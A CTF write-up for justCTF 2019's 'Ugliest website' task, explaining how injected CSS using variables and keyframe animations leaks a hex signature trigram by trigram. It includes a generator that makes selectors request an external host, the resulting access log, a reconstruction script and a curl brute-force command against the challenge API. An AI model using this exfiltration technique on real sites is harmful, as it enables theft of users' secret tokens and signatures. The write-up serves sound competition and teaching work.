# Ugliest website

## Introduction

This task is a follow-up of the `Ugly website` task from the `justCTF 2019`.

This task requires the players to exfiltrate a 64-characters hexadecimal string
(a signature) from a web page in 30 seconds, using a single CSS file limited to
5MB.

The difference between those tasks is the time limit, the charset and the length
of the secret to exfiltrate :

```
+------------------+------------+----------+------+
|                  | Time limit | Charset  | Size |
+------------------+------------+----------+------+
| Ugly website     |  6 seconds | [0-9]    |   6  |
| Ugliest website  | 30 seconds | [0-9a-f] |  30  |
+------------------+------------+----------+------+
```

The technique presented here is inspired from [This Slacker's
thread](https://old.reddit.com/r/Slackers/comments/dzrx2s).  It has been used
by The Flat Network Society to solve the both tasks.


## Description

The technique presented by `sirdarckcat` consists of absuing two features of the
CSS language : variables and animations.

While the most straightforward way to exfiltrate data with CSS is limited (using
an image on nodes that match a specific selector), using animations allows an
attacker to make several requests using the same node.

Animations use `keyframes`. As their name implies, they are images (`frames`)
that will be important for movement. The browser will then extrapolate between
these frames at the framerate of their chosing if possible.

As a result, setting an animation with 4 keyframes that contain 4 different
`background-images` property will make the browser requests these images.

The CSS variables are used to have conditional images: when setting a
`background-image`  property to value `var(--foo)`, the browser will use the
content of the `--foo` variable. If the value has not been set, it will be
ignored.

This is allows to set variables only if a specific selector matches the
document, and therefore act as a boolean variable : no request if the selector
does not match, but send a request to `var(--foo)` if the selector matches.


## Limitation

This technique, while very powerful, has a few downsides :

1. Once an image has been retrieved, the browser will keep it in its cache, and
   will thus not send a new request ;
2. Browsers may drop frames if too many keyframes are required to display an
   animation.

The first limitation can be circumvented by leaking triplets of characters:
if the secret is `deadbeef`, it will match `dea`, `ead`, `adb`, `dbe`, `bee` and
`eef`. These triplets can then be reconstructed easilly if all of them are
unique. (note that it would be much harder to apply this to a language)

The second limitation is circumvented in two ways: first by slowing down the
animation (29 seconds here, as the robot will stop after 30 seconds), and by
spreading the images on different properties. The following properties have been
identified as being able to retrieve images:
- `background-image`
- `border-image`
- `list-style-image`


## Attack

The attack consists in the following steps:
1. Generate a CSS file containing the CSS variables and animation (`gen.php`)
2. Fill the captcha to request an evaluation from the bot
3. Refresh the index page to obtain a lower-bound timestamp
4. Submit the evaluation form with pre-filled captcha
5. Refresh the index page to obtain a upper-bound timestamp
6. Retrieve every exfiltrated trigrams, and reconstruct them (`reconstruct.php`)
7. Spray the remote server with timestamp/signature couples (`pwn.sh`)


**Flag**: `justCTF{It_1s_t1m3_t0_b3gIN_n3w_eR4_0f_CS5_Inj3cTi0nS!}`


## Enhancements

While preparing this write-up, The Flat Network Society found a much faster and
realistic way to exfiltrate data from CSS : the `background-image` property
allows for an unlimited amount of URL to be requested. This can speed up the
execution to only a few seconds. It has been possible to solve this task within
the 5 seconds allocated for the easier `Ugly website` task.

Implementation is left as an exercise to the reader. ;-)


## Appendices

### gen.php
```php
<?php
function getFrames($count, $offset)
{
	$ret = "";
	for($i = 0; $i < $count; $i++) {
		$a = $offset + 3 * $i;
		$b = $a + 1;
		$c = $b + 1;
		$r = $i / $count * 100;

		$ret .= sprintf("%0.2f%% {", $r);
		$ret .= sprintf("background:var(--p%d); ",      $a);
		$ret .= sprintf("border-image:var(--p%d);",     $b);
		$ret .= sprintf("list-style-image:var(--p%d);", $c);
		$ret .= "}\n";
	}

	return $ret;
}
?>
<?php for($i = 0; $i <= 0xFFF; $i++): ?>
<?php $hex = sprintf("%03x", $i); ?>
.sgn[value*="<?=$hex?>"]{--p<?=$i?>:url("https://xer.fr/a?<?=$hex?>")}
<?php endfor; ?>

* {
	display: block;
	min-height: 50px;
	border: 1px solid blue;
	animation-duration: 29s;
}
.sgn { animation-name: a; }

@keyframes a { <?=getFrames(0x560, 0)?> }
```

### access.log
```
139.59.145.103 - - [22/Dec/2019:06:42:20 +0100] "GET /a?01a HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:20 +0100] "GET /a?049 HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:21 +0100] "GET /a?0b1 HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:21 +0100] "GET /a?0c5 HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:22 +0100] "GET /a?12a HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:23 +0100] "GET /a?1ad HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:23 +0100] "GET /a?1b0 HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:23 +0100] "GET /a?1c6 HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:23 +0100] "GET /a?1d1 HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:25 +0100] "GET /a?2a9 HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:25 +0100] "GET /a?2ba HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:25 +0100] "GET /a?2fd HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:27 +0100] "GET /a?3b8 HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:27 +0100] "GET /a?40c HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:28 +0100] "GET /a?489 HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:28 +0100] "GET /a?494 HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:28 +0100] "GET /a?4a6 HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:28 +0100] "GET /a?4b4 HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:29 +0100] "GET /a?4d4 HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:29 +0100] "GET /a?4eb HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:29 +0100] "GET /a?51b HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:30 +0100] "GET /a?57c HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:31 +0100] "GET /a?60b HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:32 +0100] "GET /a?68c HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:32 +0100] "GET /a?69e HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:32 +0100] "GET /a?6b6 HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:33 +0100] "GET /a?740 HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:33 +0100] "GET /a?77c HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:34 +0100] "GET /a?7c9 HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:34 +0100] "GET /a?7c8 HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:35 +0100] "GET /a?84a HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:35 +0100] "GET /a?851 HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:35 +0100] "GET /a?897 HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:36 +0100] "GET /a?8c2 HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:36 +0100] "GET /a?92f HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:37 +0100] "GET /a?94d HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:37 +0100] "GET /a?977 HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:38 +0100] "GET /a?9e0 HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:38 +0100] "GET /a?9f1 HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:39 +0100] "GET /a?a68 HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:39 +0100] "GET /a?a85 HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:39 +0100] "GET /a?a92 HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:39 +0100] "GET /a?ad4 HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:40 +0100] "GET /a?b04 HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:40 +0100] "GET /a?b1d HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:40 +0100] "GET /a?b48 HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:40 +0100] "GET /a?b69 HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:41 +0100] "GET /a?b74 HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:41 +0100] "GET /a?b84 HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:41 +0100] "GET /a?ba8 HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:42 +0100] "GET /a?c2b HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:42 +0100] "GET /a?c57 HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:42 +0100] "GET /a?c6b HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:43 +0100] "GET /a?c9f HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:43 +0100] "GET /a?d1c HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:44 +0100] "GET /a?d3b HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:44 +0100] "GET /a?d4b HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:44 +0100] "GET /a?d4e HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:45 +0100] "GET /a?e01 HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:46 +0100] "GET /a?eb7 HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:47 +0100] "GET /a?f12 HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
139.59.145.103 - - [22/Dec/2019:06:42:48 +0100] "GET /a?fd3 HTTP/2.0" 404 170 "http://ugly-website.web.jctf.pro/uploads/b91472f7c6cec4972f2f2c462cf661db90e8f7519be01545c140c14ee73096fa.css" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.88 Safari/537.36"
```

### reconstruct.php
```php
<?php
$c = explode("\n",
"01a
049
0b1
0c5
12a
1ad
1b0
1c6
1d1
2a9
2ba
2fd
3b8
40c
489
494
4a6
4b4
4d4
4eb
51b
57c
60b
68c
69e
6b6
740
77c
7c9
7c8
84a
851
897
8c2
92f
94d
977
9e0
9f1
a68
a85
a92
ad4
b04
b1d
b48
b69
b74
b84
ba8
c2b
c57
c6b
c9f
d1c
d3b
d4b
d4e
e01
eb7
f12
fd3");

function fuse($start, $array)
{
	if(1 === sizeof($array))
		return $start;

	foreach($array as $i => $n) {
		// start . n
		if(substr($n, 0, -1) === substr($start, -2)) {
			$new = $array;
			unset($new[$i]);
			$ret = fuse($start . substr($n, -1), $new);

			if($ret)
				return $ret;
		}

		// n . start
		if(substr($n, 1) === substr($start, 0, 2)) {
			$new = $array;
			unset($new[$i]);
			$ret = fuse($n[0] . $start, $new);

			if($ret)
				return $ret;
		}
	}
}

function isStart($array, $start)
{
	$begin = substr($start, 0, -1);

	foreach($array as $x) {
		if($x === $start)
			continue;

		$check = substr($x, -strlen($begin));
		if($check === $begin)
			return false;
	}

	return true;
}

for($i = 0; $i < sizeof($c); $i++) {
	if(isStart($c, $c[$i])) {
		$f = (fuse($c[$i], $c));

		if($f)
			exit($f);
	}
}
```

### pwn.sh
```sh
curl -Z "https://ugly-website.web.jctf.pro/api/secret?user_id=1&sgn=$(php ./reconstruct.php)&timestamp="{1576993337..1576993345}
```